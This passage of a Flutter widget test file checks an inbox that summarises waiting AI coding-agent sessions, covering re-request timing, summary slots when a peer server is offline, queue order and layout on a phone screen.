      expect(text('DEPLOY_ASK'), findsNothing, reason: 'it landed for a reply the session has left');
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsOneWidget);
      holds[1].complete();
      await settle(tester);
      expect(text('MERGE_ASK'), findsWidgets);
      await done(tester);
    });

    testWidgets('the same question, answered and then asked again, is summarised anew', (tester) async {
      final r = await repo();
      oneQuestion();
      digestAnswers = {
        'q': [
          (200, _ready(asking: ['FIRST_TIME'])),
          (200, _ready(asking: ['SECOND_TIME'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(inPanel(text('FIRST_TIME')), findsOneWidget);
      // Answered: the session goes back to idle with nothing to ask.
      rows = {_home.baseUrl: [_row('q', 'Asker', lastActivity: 2)]};
      questions = {};
      transcripts = {'q': [_typed('go'), _say('Done.')]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      // The same words, even the same tool-call id: only leaving the inbox tells them apart.
      oneQuestion();
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(digestCalls, ['q', 'q']);
      expect(inPanel(text('SECOND_TIME')), findsOneWidget);
      expect(text('FIRST_TIME'), findsNothing);
      await done(tester);
    });

    testWidgets('the same question asked again by a new tool call, without leaving, is summarised anew', (tester) async {
      final r = await repo();
      oneQuestion();
      digestAnswers = {
        'q': [
          (200, _ready(asking: ['FIRST_CALL'])),
          (200, _ready(asking: ['SECOND_CALL'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(digestCalls, ['q']);
      questions = {'q': _single('Pick one', id: 't2')};
      // The question is re-read at most every few seconds of real time.
      await tester.runAsync(() => Future<void>.delayed(const Duration(milliseconds: 4300)));
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(digestCalls, ['q', 'q']);
      expect(inPanel(text('SECOND_CALL')), findsOneWidget);
      await done(tester);
    });
  });

  group('fetching, review fixes', () {
    testWidgets('a reply is not asked again within the re-ask time while its summary is shown', (tester) async {
      final r = await repo();
      rows = {_home.baseUrl: [_row('c', 'Idle', lastActivity: 1)]};
      transcripts = {'c': [_typed('push it'), _say('Tests pass. Should I push it?')]};
      digestAnswers = {'c': [(200, _ready(asking: ['REPLY_ASK']))]};
      await pump(tester, r);
      await settle(tester);
      for (var act = 2; act < 6; act++) {
        rows = {_home.baseUrl: [_row('c', 'Idle', lastActivity: act)]};
        await tester.runAsync(() => r.refresh());
        await settle(tester);
      }
      expect(digestCalls, ['c'], reason: 'a repaint is not a new reply to summarise');
      expect(text('REPLY_ASK'), findsWidgets);
      await tester.pump(kDigestReplyReaskAfter);
      await settle(tester);
      expect(digestCalls, ['c', 'c'], reason: 'once the time is up, the newest is asked for');
      await done(tester);
    });

    testWidgets('an offline peer\'s items take no slot; a reachable item gets its summary', (tester) async {
      const both = [_home, _peer];
      final r = await repo(servers: both);
      rows = {
        _peer.baseUrl: [
          for (var i = 0; i < 3; i++)
            // Permissions: their wait is stamped from the row alone, so they would be
            // asked for even though nothing else about them can be read.
            _row('o$i', 'Off$i', status: 'waiting', waitingFor: 'permission', lastActivity: i + 1, brief: _brief('Bash \u00b7 x', i + 1)),
        ],
        _home.baseUrl: [_row('h', 'Home', status: 'waiting', waitingFor: 'question', lastActivity: 50)],
      };
      questions = {
        'h': _single('Home Q', id: 'h'),
      };
      digestAnswers = {'h': [(200, _ready(asking: ['HOME_ASK']))]};
      // Seen once while up (rows, questions and the capability), then down for good.
      await tester.runAsync(() => r.refresh());
      down = {_peer.baseUrl};
      for (var i = 0; i < SessionRepository.offlineAfterFailures; i++) {
        await tester.runAsync(() => r.refresh());
      }
      expect(r.serverUsable[_peer.baseUrl], isFalse, reason: 'precondition: the peer is offline');
      expect(r.supportsDigest(_peer.baseUrl), isTrue, reason: 'precondition: it said it writes summaries');
      await pump(tester, r, servers: both);
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-card-http://p:7681|o0')), findsOneWidget,
          reason: 'precondition: its items are still listed');
      expect(digestCalls.where((c) => c.startsWith('o')), isEmpty, reason: 'nothing is asked of a server that is down');
      expect(digestCalls, ['h']);
      expect(text('HOME_ASK'), findsWidgets);
      await done(tester);
    });

    testWidgets('focusing an item already waiting for a slot moves it to the front', (tester) async {
      rows = {
        _home.baseUrl: [
          for (var i = 0; i < 5; i++) _row('s$i', 'S$i', status: 'waiting', waitingFor: 'question', lastActivity: i + 1),
        ],
      };
      questions = {for (var i = 0; i < 5; i++) 's$i': _single('Q$i', id: 'id$i')};
      digestHolds = List.generate(5, (_) => Completer<void>());
      final holds = [...digestHolds];
      await pump(tester, await repo());
      await settle(tester);
      expect(digestCalls.length, 3);
      final queued = [for (var i = 0; i < 5; i++) 's$i'].where((x) => !digestCalls.contains(x)).toList();
      expect(queued.length, 2);
      final last = queued.last;
      await tester.tap(find.byKey(ValueKey('inbox-open-http://h:7681|$last')));
      await settle(tester);
      holds[0].complete();
      await settle(tester);
      expect(digestCalls[3], last, reason: 'the item on screen is the next one written');
      await done(tester);
    });
  });

  group('layout, review fixes', () {
    String paragraphs(String head, String tail) =>
        [head, for (var i = 0; i < 30; i++) 'Paragraph $i of what the agent said before it asked.', tail].join('\n\n');

    Rect scrollerOf(WidgetTester tester, Finder f) =>
        tester.getRect(find.ancestor(of: f, matching: find.byType(SingleChildScrollView)).first);

    testWidgets('a failed summary\'s lead-up opens at its END, next to the question', (tester) async {
      oneQuestion(lead: paragraphs('LEAD_HEAD', 'LEAD_TAIL'));
      digestAnswers = {'q': [(502, {'status': 'failed', 'reason': 'timeout'})]};
      await pump(tester, await repo());
      await settle(tester);
      final tail = inPanel(text('LEAD_TAIL'));
      final view = scrollerOf(tester, tail);
      expect(tester.getRect(tail).bottom, lessThanOrEqualTo(view.bottom + 0.5), reason: 'its end is in view');
      expect(tester.getRect(tail).top, greaterThanOrEqualTo(view.top));
      expect(tester.getRect(inPanel(text('LEAD_HEAD'))).bottom, lessThan(view.top), reason: 'it overflows: the head is a scroll up');
      await done(tester);
    });

    testWidgets('a ready summary with its full context opened opens at the END of the words', (tester) async {
      oneQuestion(lead: paragraphs('LEAD_HEAD', 'LEAD_TAIL'));
      digestAnswers = {'q': [(200, _ready())]};
      await pump(tester, await repo());
      await settle(tester);
      await tester.tap(find.byKey(const ValueKey('inbox-full-toggle')));
      await tester.pumpAndSettle();
      final tail = inPanel(text('LEAD_TAIL'));
      final view = scrollerOf(tester, tail);
      expect(tester.getRect(tail).bottom, lessThanOrEqualTo(view.bottom + 0.5));
      expect(tester.getRect(tail).top, greaterThanOrEqualTo(view.top));
      await done(tester);
    });

    testWidgets('a failed summary with no lead-up has no "Claude said" over nothing; its retry still shows',
        (tester) async {
      rows = {_home.baseUrl: [_row('q', 'Asker', status: 'waiting', waitingFor: 'question', lastActivity: 1)]};
      questions = {'q': _single('Pick one')}; // no transcript: no lead-up
      digestAnswers = {'q': [(502, {'status': 'failed', 'reason': 'timeout'})]};
      await pump(tester, await repo());
      await settle(tester);
      expect(find.text('Claude said'), findsNothing);
      expect(panel(tester).contextBody, isNull);
      expect(find.byKey(const ValueKey('inbox-digest-retry-wait')), findsOneWidget);
      await done(tester);
    });

    testWidgets('phone 360x640, permission: the command is on screen with the actions, the summary below it',
        (tester) async {
      const cmd = 'git push origin feature';
      rows = {
        _home.baseUrl: [
          _row('p', 'Pusher', status: 'waiting', waitingFor: 'permission', lastActivity: 1, brief: _brief('Bash \u00b7 Push', 1)),
        ],
      };
      transcripts = {'p': [_typed('push'), _say('About to push.'), _call(cmd)]};
      digestAnswers = {
        'p': [
          (200, _ready(
              about: List.filled(6, 'The session finished the feature and is ready to publish it to the remote.').join(' '),
              asking: ['Allow the session to push the feature branch to origin?'],
              know: List.generate(6, (i) => 'KNOW_$i: a fact that matters for the choice, long enough to wrap twice on a phone.'))),
        ],
      };
      await pump(tester, await repo(), width: 360, height: 640);
      await settle(tester);
      await tester.tap(find.byKey(const ValueKey('inbox-open-http://h:7681|p')));
      await tester.pumpAndSettle();
      await settle(tester);
      expect(tester.takeException(), isNull);
      expect(find.byKey(const ValueKey('inbox-digest')), findsOneWidget);
      final command = tester.getRect(find.byKey(const ValueKey('inbox-tool-call')));
      expect(command.top, greaterThanOrEqualTo(0));
      expect(command.bottom, lessThanOrEqualTo(640), reason: 'the command is on screen');
      final open = tester.getRect(find.byKey(const ValueKey('inbox-open-session')));
      expect(open.bottom, lessThanOrEqualTo(640), reason: 'with the actions');
      expect(command.bottom, lessThanOrEqualTo(open.top), reason: 'and not under them');
      expect(tester.getRect(find.byKey(const ValueKey('inbox-digest'))).top, greaterThanOrEqualTo(command.bottom),
          reason: 'the summary comes after the command');
      await done(tester);
    });
  });

  test('leadTeaser cuts on characters: an emoji is never split', () {
    final t = leadTeaser('a${List.filled(20, '\u{1F600}').join()}', maxChars: 9);
    expect(t.runes.any((r) => r >= 0xD800 && r <= 0xDFFF), isFalse, reason: 'no lone surrogate');
    expect(t, '\u2026${List.filled(9, '\u{1F600}').join()}');
  });
}
